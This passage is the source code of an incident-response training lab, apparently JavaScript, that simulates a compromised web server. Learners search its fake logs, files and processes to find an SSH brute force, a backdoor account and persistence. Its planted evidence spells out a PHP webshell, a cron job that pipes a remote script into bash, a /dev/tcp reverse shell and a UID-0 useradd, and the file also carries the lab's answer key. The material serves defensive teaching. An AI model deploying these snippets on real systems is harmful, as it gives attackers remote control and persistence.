window.CP = window.CP || {};
CP.labs = CP.labs || [];
CP.labs.push({
  id: "lab-linux-terminal",
  title: "Linux Terminal Investigation: Compromised Web Server",
  module: "p0-m3",
  difficulty: "Beginner",
  minutes: 30,
  skills: ["Linux navigation", "grep & pipes", "log analysis", "process & socket inspection", "persistence hunting"],
  briefing: `
    <p><b>Scenario:</b> It is 07:40 on a Tuesday. The hosting team reports that <code>web01</code>, an internet-facing
    Ubuntu server running the company brochure site, has been sending traffic to an unknown external address all night.
    You have been given a shell on the box as <code>analyst</code> (read access to logs and most of the filesystem)
    and asked to scope the compromise <i>before</i> anyone reboots it.</p>
    <p><b>Objectives:</b></p>
    <ul>
      <li>Use <code>ls</code>, <code>cd</code>, <code>cat</code>, <code>grep</code>, <code>find</code> and pipes to navigate and search the filesystem.</li>
      <li>Identify how the attacker got in (SSH brute force in <code>/var/log/auth.log</code>).</li>
      <li>Find what they left behind: a backdoor account, a webshell, a malicious cron job and a live reverse shell.</li>
    </ul>
    <div class="callout tip">Type <code>help</code> in the terminal to see supported commands. Use the up/down arrows for command history
    and Tab to complete file names. Start by reading <code>~/TICKET.txt</code>.</div>
    <div class="callout real">On a real incident you would capture volatile data (processes, network connections) first and
    avoid changing the system. Everything here is read-only, so explore freely.</div>
  `,
  render(container, ctx) {
    const esc = ctx.escape;
    container.classList.add("lab-lab-linux-terminal");

    // ---------- deterministic data generation ----------
    let seed = 1337;
    const rnd = () => { seed = (seed * 1103515245 + 12345) % 2147483648; return seed / 2147483648; };
    const ri = (a, b) => a + Math.floor(rnd() * (b - a + 1));
    const pick = (arr) => arr[Math.floor(rnd() * arr.length)];
    const pad = (n) => String(n).padStart(2, "0");

    const ATTACKER = "203.0.113.45";
    const C2 = "198.51.100.23";
    const ATTACK_FAILS = 38;

    function authLog() {
      const lines = [];
      let t = 13 * 3600 + 2 * 60; // Oct 13 13:02
      let day = 13;
      const stamp = () => {
        if (t >= 86400) { t -= 86400; day++; }
        return `Oct ${day} ${pad(Math.floor(t / 3600))}:${pad(Math.floor((t % 3600) / 60))}:${pad(t % 60)}`;
      };
      let pid = 1800;
      const L = (proc, msg) => lines.push(`${stamp()} web01 ${proc}[${pid}]: ${msg}`);
      // normal daytime activity
      for (let i = 0; i < 6; i++) {
        t += ri(1500, 4000); pid += ri(3, 40);
        L("sshd", `Accepted publickey for deploy from 10.0.5.20 port ${ri(40000, 60000)} ssh2: RSA SHA256:q8Jt0aV3kPz1mLx7c4eYwQ2rB9sNf6hUo5iDgTj0E1k`);
        L("sshd", `pam_unix(sshd:session): session opened for user deploy(uid=1001) by (uid=0)`);
        t += ri(30, 400);
        L("sudo", `   deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/systemctl reload apache2`);
        t += ri(60, 900);
        L("sshd", `pam_unix(sshd:session): session closed for user deploy`);
        if (i % 2 === 0) { t += ri(200, 900); L("CRON", `pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)`); }
      }
      // background internet noise from another scanner
      const noiseUsers = ["test", "ubuntu", "pi", "guest", "user", "ftp"];
      for (let i = 0; i < 6; i++) {
        t += ri(400, 1800); pid += ri(3, 30);
        const u = noiseUsers[i];
        L("sshd", `Invalid user ${u} from 192.0.2.77 port ${ri(30000, 65000)}`);
        L("sshd", `Failed password for invalid user ${u} from 192.0.2.77 port ${ri(30000, 65000)} ssh2`);
        L("sshd", `Connection closed by invalid user ${u} 192.0.2.77 port ${ri(30000, 65000)} [preauth]`);
      }
      // the brute force, overnight
      t = 86400 + 2 * 3600 + 11 * 60 + 4; // Oct 14 02:11:04 (wraps day)
      const tried = ["admin", "root", "oracle", "postgres", "www-admin", "webmaster", "www-admin", "root", "www-admin"];
      for (let i = 0; i < ATTACK_FAILS; i++) {
        t += ri(2, 9); pid += ri(1, 4);
        const u = i < 20 ? pick(tried) : "www-admin";
        const invalid = !["root", "www-admin", "postgres"].includes(u);
        if (invalid) L("sshd", `Invalid user ${u} from ${ATTACKER} port ${ri(40000, 65000)}`);
        L("sshd", `Failed password for ${invalid ? "invalid user " : ""}${u} from ${ATTACKER} port ${ri(40000, 65000)} ssh2`);
        if (i % 6 === 5) L("sshd", `Disconnecting authenticating user ${u} ${ATTACKER} port ${ri(40000, 65000)}: Too many authentication failures [preauth]`);
      }
      t += 5; pid += 2;
      L("sshd", `Accepted password for www-admin from ${ATTACKER} port 50122 ssh2`);
      L("sshd", `pam_unix(sshd:session): session opened for user www-admin(uid=1002) by (uid=0)`);
      t += 41;
      L("sudo", `www-admin : TTY=pts/1 ; PWD=/home/www-admin ; USER=root ; COMMAND=/bin/bash`);
      t += 30; pid += 5;
      L("useradd", `new group: name=sysupdate, GID=0`);
      L("useradd", `new user: name=sysupdate, UID=0, GID=0, home=/var/tmp/.sys, shell=/bin/bash, from=/dev/pts/1`);
      t += 12;
      L("passwd", `pam_unix(passwd:chauthtok): password changed for sysupdate`);
      t += 600;
      L("sshd", `pam_unix(sshd:session): session closed for user www-admin`);
      for (let i = 0; i < 3; i++) {
        t += ri(1200, 3000); pid += ri(3, 30);
        L("CRON", `pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)`);
      }
      return lines.join("\n") + "\n";
    }

    function accessLog() {
      const lines = [];
      const pages = ["/", "/index.php", "/about.html", "/contact.php", "/css/style.css", "/uploads/logo.png", "/uploads/banner.jpg", "/favicon.ico"];
      const agents = ["Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
        "Mozilla/5.0 (compatible; ExampleBot/2.1; +http://bot.example.com/)"];
      const clients = ["192.0.2.14", "192.0.2.88", "198.51.100.140", "10.0.5.20", "192.0.2.201"];
      let m = 0;
      for (let i = 0; i < 40; i++) {
        m += ri(5, 40);
        const h = 13 + Math.floor(m / 60), mm = m % 60;
        const p = pick(pages);
        lines.push(`${pick(clients)} - - [13/Oct/2025:${pad(h % 24)}:${pad(mm)}:${pad(ri(0, 59))} +0000] "GET ${p} HTTP/1.1" ${p === "/favicon.ico" ? 404 : 200} ${ri(300, 18000)} "-" "${pick(agents)}"`);
      }
      const atk = [
        ["POST", "/contact.php", 200, "upload=1"],
        ["GET", "/uploads/.cache.php?cmd=id", 200],
        ["GET", "/uploads/.cache.php?cmd=uname%20-a", 200],
        ["GET", "/uploads/.cache.php?cmd=cat%20/etc/passwd", 200],
        ["GET", "/uploads/.cache.php?cmd=wget%20http://" + C2 + "/rs.sh%20-O%20/tmp/.x/rs.sh", 200],
        ["GET", "/uploads/.cache.php?cmd=bash%20/tmp/.x/rs.sh", 200]
      ];
      let s = 0;
      atk.forEach((a) => {
        s += ri(20, 90);
        lines.push(`${ATTACKER} - - [14/Oct/2025:02:${pad(26 + Math.floor(s / 60))}:${pad(s % 60)} +0000] "${a[0]} ${a[1]} HTTP/1.1" ${a[2]} ${ri(40, 900)} "-" "python-requests/2.31.0"`);
      });
      for (let i = 0; i < 8; i++) {
        lines.push(`${pick(clients)} - - [14/Oct/2025:0${6 + Math.floor(i / 4)}:${pad(ri(0, 59))}:${pad(ri(0, 59))} +0000] "GET ${pick(pages)} HTTP/1.1" 200 ${ri(300, 18000)} "-" "${pick(agents)}"`);
      }
      return lines.join("\n") + "\n";
    }

    // ---------- fake filesystem ----------
    const FS = {}; // path -> {type:'d'|'f', content, owner, group, perms, date, size}
    function addDir(p, o) { FS[p] = Object.assign({ type: "d", owner: "root", group: "root", perms: "drwxr-xr-x", date: "Sep 30 09:12" }, o || {}); }
    function addFile(p, content, o) {
      const parts = p.split("/").filter(Boolean);
      let cur = "";
      for (let i = 0; i < parts.length - 1; i++) { cur += "/" + parts[i]; if (!FS[cur]) addDir(cur); }
      FS[p] = Object.assign({ type: "f", content: content, owner: "root", group: "root", perms: "-rw-r--r--", date: "Sep 30 09:12" }, o || {});
    }
    addDir("/");
    ["/bin", "/boot", "/dev", "/etc", "/home", "/opt", "/proc", "/root", "/srv", "/tmp", "/usr", "/var", "/var/log", "/var/tmp", "/var/www"].forEach((d) => addDir(d));
    FS["/root"].perms = "drwx------"; FS["/tmp"].perms = "drwxrwxrwt"; FS["/var/tmp"].perms = "drwxrwxrwt";

    addFile("/home/analyst/TICKET.txt",
`TICKET IR-2291  |  Priority: HIGH  |  Host: web01 (192.0.2.10 public / 10.0.5.10 internal)
-----------------------------------------------------------------------------
Reported by: Hosting team, 07:12
NetFlow shows web01 holding a long-lived TCP session to an external host
since ~02:30 UTC. The site is a simple PHP brochure site; nobody should be
logging in outside business hours except the 'deploy' account from 10.0.5.20.

Please determine:
  - how the attacker got in
  - any accounts they created
  - any webshells / persistence
  - any live attacker connections (which process?)

Useful places:  /var/log/auth.log  /var/log/apache2/  /etc/passwd
                /etc/cron.d/  /var/www/html/  ps aux  ss -tanp
`, { owner: "analyst", group: "analyst" });
    FS["/home/analyst"].owner = "analyst"; FS["/home/analyst"].group = "analyst";
    addFile("/home/analyst/.bashrc", "# ~/.bashrc\nalias ll='ls -la'\nexport HISTSIZE=1000\n", { owner: "analyst", group: "analyst" });

    addFile("/etc/hostname", "web01\n");
    addFile("/etc/os-release", 'PRETTY_NAME="Ubuntu 22.04.4 LTS"\nNAME="Ubuntu"\nVERSION_ID="22.04"\nID=ubuntu\n');
    addFile("/etc/passwd",
`root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
mysql:x:113:118:MySQL Server,,,:/nonexistent:/bin/false
deploy:x:1001:1001:Deploy Bot,,,:/home/deploy:/bin/bash
www-admin:x:1002:1002:Web Admin,,,:/home/www-admin:/bin/bash
analyst:x:1003:1003:IR Analyst,,,:/home/analyst:/bin/bash
sysupdate:x:0:0::/var/tmp/.sys:/bin/bash
`);
    addFile("/etc/group", "root:x:0:\nsudo:x:27:deploy,www-admin\nwww-data:x:33:\ndeploy:x:1001:\nwww-admin:x:1002:\nanalyst:x:1003:\nsysupdate:x:0:\n");
    addFile("/etc/shadow", "", { perms: "-rw-r-----", group: "shadow", denied: true });
    addFile("/etc/crontab",
`# /etc/crontab: system-wide crontab
SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
`);
    addFile("/etc/cron.d/certbot", "# renew certificates twice a day\n0 */12 * * * root test -x /usr/bin/certbot && certbot -q renew\n");
    addFile("/etc/cron.d/site-backup", "# nightly site backup (ticket CHG-1180)\n30 1 * * * deploy tar czf /srv/backup/site-$(date +\\%F).tgz /var/www/html\n");
    addFile("/etc/cron.d/php-update", `# php session cleanup\n*/5 * * * * root curl -fsSL http://${C2}/u.sh | bash >/dev/null 2>&1\n`, { date: "Oct 14 02:34" });
    addFile("/etc/cron.daily/logrotate", "#!/bin/sh\n/usr/sbin/logrotate /etc/logrotate.conf\n", { perms: "-rwxr-xr-x" });
    addFile("/etc/ssh/sshd_config", "Port 22\nPermitRootLogin no\nPasswordAuthentication yes\nMaxAuthTries 6\nUsePAM yes\nX11Forwarding no\n");
    addFile("/etc/apache2/sites-enabled/000-default.conf", "<VirtualHost *:80>\n    ServerName www.example.com\n    DocumentRoot /var/www/html\n    ErrorLog ${APACHE_LOG_DIR}/error.log\n    CustomLog ${APACHE_LOG_DIR}/access.log combined\n</VirtualHost>\n");

    const auth = authLog();
    addFile("/var/log/auth.log", auth, { owner: "syslog", group: "adm", perms: "-rw-r-----", date: "Oct 14 07:38" });
    addFile("/var/log/apache2/access.log", accessLog(), { group: "adm", perms: "-rw-r-----", date: "Oct 14 07:39" });
    addFile("/var/log/apache2/error.log",
`[Tue Oct 14 02:26:51 2025] [php:notice] [pid 2380] PHP Notice: Undefined index: name in /var/www/html/contact.php on line 14
[Tue Oct 14 02:27:40 2025] [php:warn] [pid 2381] PHP Warning: move_uploaded_file(): file extension not validated in /var/www/html/contact.php on line 22
`, { group: "adm", perms: "-rw-r-----" });
    addFile("/var/log/syslog",
`Oct 14 02:35:01 web01 CRON[2402]: (root) CMD (curl -fsSL http://${C2}/u.sh | bash >/dev/null 2>&1)
Oct 14 02:40:01 web01 CRON[2433]: (root) CMD (curl -fsSL http://${C2}/u.sh | bash >/dev/null 2>&1)
Oct 14 02:45:01 web01 CRON[2470]: (root) CMD (curl -fsSL http://${C2}/u.sh | bash >/dev/null 2>&1)
Oct 14 06:25:01 web01 CRON[3010]: (root) CMD (test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily ))
Oct 14 07:00:01 web01 CRON[3120]: (root) CMD (test -x /usr/bin/certbot && certbot -q renew)
`, { owner: "syslog", group: "adm", perms: "-rw-r-----" });

    addDir("/var/www/html", { owner: "www-data", group: "www-data" });
    const W = { owner: "www-data", group: "www-data" };
    addFile("/var/www/html/index.php", "<?php include 'header.php'; ?>\n<h1>Welcome to Example Widgets</h1>\n<p>Quality widgets since 1999.</p>\n<?php include 'footer.php'; ?>\n", W);
    addFile("/var/www/html/header.php", "<html><head><link rel=\"stylesheet\" href=\"/css/style.css\"></head><body>\n", W);
    addFile("/var/www/html/footer.php", "<footer>&copy; Example Widgets</footer></body></html>\n", W);
    addFile("/var/www/html/about.html", "<html><body><h1>About us</h1><p>Family owned.</p></body></html>\n", W);
    addFile("/var/www/html/contact.php",
`<?php
// contact form with optional attachment
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $name = $_POST['name'];
    if (isset($_FILES['attachment'])) {
        // TODO: validate file type!!
        move_uploaded_file($_FILES['attachment']['tmp_name'], 'uploads/' . $_FILES['attachment']['name']);
    }
    echo "Thanks!";
}
?>
`, W);
    addFile("/var/www/html/css/style.css", "body { font-family: sans-serif; }\nfooter { color: #888; }\n", W);
    addFile("/var/www/html/uploads/logo.png", "\u0089PNG (binary data)\n", W);
    addFile("/var/www/html/uploads/banner.jpg", "\u00ff\u00d8\u00ff JFIF (binary data)\n", W);
    addFile("/var/www/html/uploads/.cache.php", "<?php if(isset($_REQUEST['cmd'])){ echo '<pre>'; system($_REQUEST['cmd']); echo '</pre>'; } ?>\n", Object.assign({ date: "Oct 14 02:26" }, W));

    addFile("/home/deploy/.bash_history", "cd /var/www/html\ngit pull\nsudo systemctl reload apache2\nexit\n", { owner: "deploy", group: "deploy", perms: "-rw-------" });
    FS["/home/deploy"].owner = "deploy";
    addFile("/home/www-admin/.bash_history",
`id
uname -a
sudo -l
sudo /bin/bash
useradd -o -u 0 -g 0 -d /var/tmp/.sys -s /bin/bash sysupdate
passwd sysupdate
mkdir -p /var/tmp/.sys /tmp/.x
echo '*/5 * * * * root curl -fsSL http://${C2}/u.sh | bash >/dev/null 2>&1' > /etc/cron.d/php-update
history -c
`, { owner: "www-admin", group: "www-admin", perms: "-rw-------", date: "Oct 14 02:41" });
    FS["/home/www-admin"].owner = "www-admin";
    addFile("/home/www-admin/notes.txt", "remember: change default password Summer2024! before go-live\n", { owner: "www-admin", group: "www-admin" });
    addFile("/tmp/.x/rs.sh", `#!/bin/bash\nwhile true; do bash -i >& /dev/tcp/${C2}/4444 0>&1; sleep 30; done\n`, { owner: "www-data", group: "www-data", perms: "-rwxr-xr-x", date: "Oct 14 02:29" });
    FS["/tmp/.x"].owner = "www-data";
    addDir("/var/tmp/.sys", { date: "Oct 14 02:33" });
    addFile("/var/tmp/.sys/.bashrc", "export PS1='\\u@\\h:\\w\\$ '\n");
    addFile("/srv/backup/site-2025-10-13.tgz", "(gzip data)\n", { owner: "deploy", group: "deploy" });
    addFile("/opt/README", "Nothing installed here.\n");

    const PS = [
      ["root", 1, "0.0", "0.1", "167744", "11320", "?", "Ss", "Sep30", "0:12", "/sbin/init"],
      ["root", 412, "0.0", "0.0", "15432", "6880", "?", "Ss", "Sep30", "0:00", "/usr/sbin/sshd -D"],
      ["syslog", 430, "0.0", "0.0", "222404", "5300", "?", "Ssl", "Sep30", "0:03", "/usr/sbin/rsyslogd -n -iNONE"],
      ["root", 455, "0.0", "0.0", "6812", "2844", "?", "Ss", "Sep30", "0:01", "/usr/sbin/cron -f"],
      ["mysql", 610, "0.3", "4.1", "1762056", "402112", "?", "Ssl", "Sep30", "41:07", "/usr/sbin/mysqld"],
      ["root", 702, "0.0", "0.2", "203812", "21032", "?", "Ss", "Sep30", "0:30", "/usr/sbin/apache2 -k start"],
      ["www-data", 2380, "0.0", "0.1", "204380", "12820", "?", "S", "02:20", "0:00", "/usr/sbin/apache2 -k start"],
      ["www-data", 2381, "0.0", "0.1", "204380", "12780", "?", "S", "02:20", "0:00", "/usr/sbin/apache2 -k start"],
      ["www-data", 2414, "0.0", "0.0", "2888", "960", "?", "S", "02:29", "0:00", "sh -c bash /tmp/.x/rs.sh"],
      ["www-data", 2415, "0.0", "0.0", "7372", "3420", "?", "S", "02:29", "0:00", "/bin/bash /tmp/.x/rs.sh"],
      ["www-data", 2417, "0.0", "0.0", "7636", "4012", "?", "S", "02:29", "0:00", "bash -i"],
      ["root", 3188, "0.0", "0.1", "17204", "10840", "?", "Ss", "07:35", "0:00", "sshd: analyst [priv]"],
      ["analyst", 3201, "0.0", "0.0", "8780", "5420", "pts/0", "Ss", "07:35", "0:00", "-bash"],
      ["analyst", 3255, "0.0", "0.0", "10072", "3460", "pts/0", "R+", "07:41", "0:00", "ps aux"]
    ];
    const SOCK = [
      ["tcp", "LISTEN", "0.0.0.0:22", "0.0.0.0:*", 'users:(("sshd",pid=412,fd=3))'],
      ["tcp", "LISTEN", "127.0.0.1:3306", "0.0.0.0:*", 'users:(("mysqld",pid=610,fd=21))'],
      ["tcp", "LISTEN", "*:80", "*:*", 'users:(("apache2",pid=702,fd=4))'],
      ["udp", "UNCONN", "127.0.0.53%lo:53", "0.0.0.0:*", 'users:(("systemd-resolve",pid=388,fd=13))'],
      ["tcp", "ESTAB", "10.0.5.10:22", "10.0.5.31:51544", 'users:(("sshd",pid=3188,fd=4))'],
      ["tcp", "ESTAB", "10.0.5.10:43872", C2 + ":4444", 'users:(("bash",pid=2417,fd=0),("bash",pid=2417,fd=1),("bash",pid=2417,fd=2))']
    ];

    // ---------- tasks ----------
    const TASKS = [
      { q: "Which external IP address brute-forced SSH and eventually logged in successfully?", a: [ATTACKER], hint: "grep \"Accepted\" /var/log/auth.log" ,
        why: `${ATTACKER} produced dozens of 'Failed password' lines and then 'Accepted password for www-admin' at 02:15. 192.0.2.77 is background scanning noise with no success.` },
      { q: `How many 'Failed password' lines in auth.log come from that IP?`, a: [String(ATTACK_FAILS)], hint: `grep "Failed password" /var/log/auth.log | grep ${"<ip>"} | wc -l`,
        why: `grep "Failed password" /var/log/auth.log | grep ${ATTACKER} | wc -l returns ${ATTACK_FAILS}. Note that grepping only for the IP gives a bigger number because 'Invalid user' and 'Disconnecting' lines also contain it - be precise about what you count.` },
      { q: "Which backdoor account did the attacker create? (it has UID 0)", a: ["sysupdate"], hint: "grep ':0:' /etc/passwd   or   grep useradd /var/log/auth.log",
        why: "sysupdate has UID 0 and GID 0, i.e. it is a second root account (T1136.001 Create Account). Any UID 0 account other than root is a red flag." },
      { q: "What is the file name of the webshell under /var/www/html?", a: [".cache.php", "/var/www/html/uploads/.cache.php", "uploads/.cache.php"], hint: "find /var/www/html -name \"*.php\"   then  ls -la /var/www/html/uploads",
        why: "uploads/.cache.php is a hidden PHP file that passes ?cmd= to system() (T1505.003 Web Shell). It was dropped through the unvalidated upload in contact.php - the access log shows the attacker calling it." },
      { q: "Which file in /etc/cron.d holds the malicious cron job?", a: ["php-update", "/etc/cron.d/php-update"], hint: "ls -la /etc/cron.d   then cat each file; or grep -r curl /etc/cron.d",
        why: `php-update runs every 5 minutes as root and pipes a script from http://${C2}/u.sh into bash (T1053.003 Cron). A misleading comment ('php session cleanup') is a classic disguise.` },
      { q: "What is the PID of the live reverse shell process holding the connection to the attacker?", a: ["2417"], hint: "ss -tanp   and   ps aux | grep bash",
        why: `ss shows an ESTAB connection from 10.0.5.10 to ${C2}:4444 owned by bash pid=2417; ps aux shows 2417 is 'bash -i' running as www-data, a child of /tmp/.x/rs.sh.` }
    ];

    // ---------- UI ----------
    const style = document.createElement("style");
    style.textContent = `
      .lab-lab-linux-terminal .lt-wrap { display:grid; grid-template-columns: minmax(0,3fr) minmax(0,2fr); gap:16px; align-items:start; }
      @media (max-width: 900px) { .lab-lab-linux-terminal .lt-wrap { grid-template-columns: 1fr; } }
      .lab-lab-linux-terminal .term { height: 460px; overflow-y:auto; cursor:text; }
      .lab-lab-linux-terminal .term-line { white-space: pre-wrap; word-break: break-all; min-height:1.2em; }
      .lab-lab-linux-terminal .lt-err { color: var(--bad); }
      .lab-lab-linux-terminal .lt-dir { color: var(--accent); font-weight: 600; }
      .lab-lab-linux-terminal .lt-prompt { color: var(--good); }
      .lab-lab-linux-terminal .lt-inrow { display:flex; gap:6px; align-items:center; }
      .lab-lab-linux-terminal .lt-inrow input { flex:1; background:transparent; border:0; outline:none; color:inherit; font:inherit; padding:0; }
      .lab-lab-linux-terminal .lt-task { padding:10px 12px; }
      .lab-lab-linux-terminal .lt-task .row { margin-top:6px; }
      .lab-lab-linux-terminal .lt-task .input { flex:1; min-width:0; }
      .lab-lab-linux-terminal .lt-hint { font-size: .85em; margin-top:4px; }
      .lab-lab-linux-terminal .lt-fb { margin-top:6px; font-size:.9em; }
    `;
    container.appendChild(style);

    const saved = ctx.store("answers") || {};
    container.insertAdjacentHTML("beforeend", `
      <div class="lt-wrap">
        <div class="stack">
          <div class="term" data-el="term" aria-label="Simulated terminal"><div data-el="out"></div>
            <div class="lt-inrow term-line"><span class="lt-prompt" data-el="prompt"></span><input class="term-input" data-el="in" spellcheck="false" autocomplete="off" aria-label="Terminal input"></div>
          </div>
          <div class="muted" style="font-size:.85em">Tip: <span class="mono">help</span> lists commands &middot; &uarr;/&darr; history &middot; Tab completes paths &middot; <span class="mono">clear</span> or Ctrl+L clears.</div>
        </div>
        <div class="stack">
          <h3 style="margin:0">Investigation tasks</h3>
          <div class="stack" data-el="tasks"></div>
          <div class="row"><button class="btn primary" data-el="check">Check answers</button><span class="muted" data-el="progress"></span></div>
          <div data-el="result"></div>
        </div>
      </div>`);
    const $ = (s) => container.querySelector(`[data-el="${s}"]`);
    const termEl = $("term"), outEl = $("out"), inEl = $("in"), promptEl = $("prompt");

    const tasksEl = $("tasks");
    TASKS.forEach((t, i) => {
      const d = document.createElement("div");
      d.className = "card lt-task";
      d.innerHTML = `<div><b>${i + 1}.</b> ${esc(t.q)}</div>
        <div class="row"><input class="input mono" data-task="${i}" placeholder="your answer" value="${esc(saved[i] || "")}">
        <button class="btn ghost" data-hint="${i}" type="button">Hint</button></div>
        <div class="lt-hint muted mono" data-hinttext="${i}" hidden>${esc(t.hint)}</div>
        <div class="lt-fb" data-fb="${i}"></div>`;
      tasksEl.appendChild(d);
    });
    tasksEl.addEventListener("click", (e) => {
      const h = e.target.closest("[data-hint]");
      if (h) { const el = tasksEl.querySelector(`[data-hinttext="${h.dataset.hint}"]`); el.hidden = !el.hidden; }
    });
    tasksEl.addEventListener("input", (e) => {
      if (e.target.dataset.task !== undefined) {
        const cur = ctx.store("answers") || {};
        cur[e.target.dataset.task] = e.target.value;
        ctx.store("answers", cur);
        updateProgress();
      }
    });
    function updateProgress() {
      const n = [...tasksEl.querySelectorAll("[data-task]")].filter((x) => x.value.trim()).length;
      $("progress").textContent = `${n}/${TASKS.length} answered`;
    }
    updateProgress();

    const norm = (s) => String(s).trim().toLowerCase().replace(/^['"]|['"]$/g, "");
    let completed = false;
    $("check").addEventListener("click", () => {
      let correct = 0, answered = 0;
      TASKS.forEach((t, i) => {
        const v = tasksEl.querySelector(`[data-task="${i}"]`).value;
        const fb = tasksEl.querySelector(`[data-fb="${i}"]`);
        if (!v.trim()) { fb.innerHTML = `<span class="tag warn">not answered</span>`; return; }
        answered++;
        const ok = t.a.map(norm).includes(norm(v));
        if (ok) correct++;
        fb.innerHTML = `<span class="tag ${ok ? "good" : "bad"}">${ok ? "Correct" : "Not quite"}</span> ${ok ? esc(t.why) : "Keep digging - use the hint if you are stuck."}`;
      });
      const res = $("result");
      if (answered < TASKS.length) {
        res.innerHTML = `<div class="alert info">${correct}/${answered} answered tasks correct. Answer all ${TASKS.length} tasks to finish the lab.</div>`;
        return;
      }
      const score = Math.round((correct / TASKS.length) * 100);
      // reveal explanations for all once finished
      TASKS.forEach((t, i) => {
        const fb = tasksEl.querySelector(`[data-fb="${i}"]`);
        if (!fb.innerHTML.includes("Correct")) fb.innerHTML += `<div class="muted">Answer: <span class="mono">${esc(t.a[0])}</span> - ${esc(t.why)}</div>`;
      });
      res.innerHTML = `<div class="alert ${score >= 70 ? "good" : "bad"}"><b>Score: ${score}%</b> (${correct}/${TASKS.length}).
        Attack chain: SSH brute force &rarr; www-admin login &rarr; sudo to root &rarr; UID-0 backdoor user &rarr; cron persistence;
        separately the vulnerable upload form was abused to plant a webshell, which launched a reverse shell. Next steps would be to isolate the
        host, preserve evidence, block ${C2} and ${ATTACKER}, rotate credentials and rebuild from a known-good image.</div>`;
      if (!completed) { completed = true; ctx.complete(score); }
    });

    // ---------- shell ----------
    const HOME = "/home/analyst";
    let cwd = HOME;
    const history = [];
    let hIdx = 0;
    const cmdHistory = ["ls", "cat TICKET.txt"];

    function promptStr() { return `analyst@web01:${cwd === HOME ? "~" : cwd.startsWith(HOME + "/") ? "~" + cwd.slice(HOME.length) : cwd}$ `; }
    function setPrompt() { promptEl.textContent = promptStr(); }

    function resolve(p) {
      if (p === undefined || p === "") return cwd;
      if (p === "~") p = HOME; else if (p.startsWith("~/")) p = HOME + p.slice(1);
      const parts = (p.startsWith("/") ? p : cwd + "/" + p).split("/");
      const stack = [];
      parts.forEach((s) => { if (!s || s === ".") return; if (s === "..") stack.pop(); else stack.push(s); });
      return "/" + stack.join("/");
    }
    function children(dir) {
      const pre = dir === "/" ? "/" : dir + "/";
      return Object.keys(FS).filter((k) => k !== dir && k.startsWith(pre) && !k.slice(pre.length).includes("/")).sort();
    }
    const base = (p) => p === "/" ? "/" : p.split("/").pop();
    function readable(p) {
      const n = FS[p];
      if (!n) return false;
      if (n.denied) return false;
      if (p === "/root" || p.startsWith("/root/")) return false;
      return true;
    }

    function tokenize(s) {
      const out = []; let cur = ""; let q = null; let has = false;
      for (let i = 0; i < s.length; i++) {
        const c = s[i];
        if (q) { if (c === q) q = null; else cur += c; }
        else if (c === '"' || c === "'") { q = c; has = true; }
        else if (c === "\\" && i + 1 < s.length) { cur += s[++i]; has = true; }
        else if (/\s/.test(c)) { if (cur || has) { out.push(cur); cur = ""; has = false; } }
        else cur += c;
      }
      if (q) throw new Error("unexpected EOF while looking for matching `" + q + "'");
      if (cur || has) out.push(cur);
      return out;
    }
    function splitPipes(s) {
      const segs = []; let cur = ""; let q = null;
      for (const c of s) {
        if (q) { if (c === q) q = null; cur += c; }
        else if (c === '"' || c === "'") { q = c; cur += c; }
        else if (c === "|") { segs.push(cur); cur = ""; }
        else cur += c;
      }
      segs.push(cur);
      return segs;
    }
    function parseFlags(args) {
      const flags = new Set(), rest = [];
      args.forEach((a) => { if (/^-[a-zA-Z]+$/.test(a)) a.slice(1).split("").forEach((f) => flags.add(f)); else rest.push(a); });
      return { flags, rest };
    }
    function globToRe(g) { return new RegExp("^" + g.replace(/[.+^${}()|[\]\\]/g, "\\$&").replace(/\*/g, ".*").replace(/\?/g, ".") + "$"); }
    function linesOf(text) { if (!text) return []; const l = text.split("\n"); if (l[l.length - 1] === "") l.pop(); return l; }
    const joinL = (arr) => arr.length ? arr.join("\n") + "\n" : "";

    // Read input either from files or stdin. Returns {text, err, multi:[{name,text}]}
    function readInputs(cmd, files, stdin) {
      if (!files.length) return { items: [{ name: null, text: stdin || "" }], errs: [] };
      const items = [], errs = [];
      files.forEach((f) => {
        const p = resolve(f), n = FS[p];
        if (!n) errs.push(`${cmd}: ${f}: No such file or directory`);
        else if (n.type === "d") errs.push(`${cmd}: ${f}: Is a directory`);
        else if (!readable(p)) errs.push(`${cmd}: ${f}: Permission denied`);
        else items.push({ name: f, text: n.content });
      });
      return { items, errs };
    }
    function numArg(args, def) {
      let n = def; const rest = [];
      for (let i = 0; i < args.length; i++) {
        const a = args[i];
        if (a === "-n" && args[i + 1] !== undefined) { n = parseInt(args[++i], 10); }
        else if (/^-n\d+$/.test(a)) n = parseInt(a.slice(2), 10);
        else if (/^-\d+$/.test(a)) n = parseInt(a.slice(1), 10);
        else rest.push(a);
      }
      return { n: isNaN(n) ? def : n, rest };
    }

    function lsLong(p, name) {
      const n = FS[p];
      const size = n.type === "d" ? 4096 : (n.content || "").length;
      return `${n.perms} ${n.type === "d" ? 2 : 1} ${n.owner.padEnd(9)} ${n.group.padEnd(9)} ${String(size).padStart(6)} ${n.date} ${name}`;
    }

    const COMMANDS = {
      help() {
        return { out: `Supported commands (simulated):
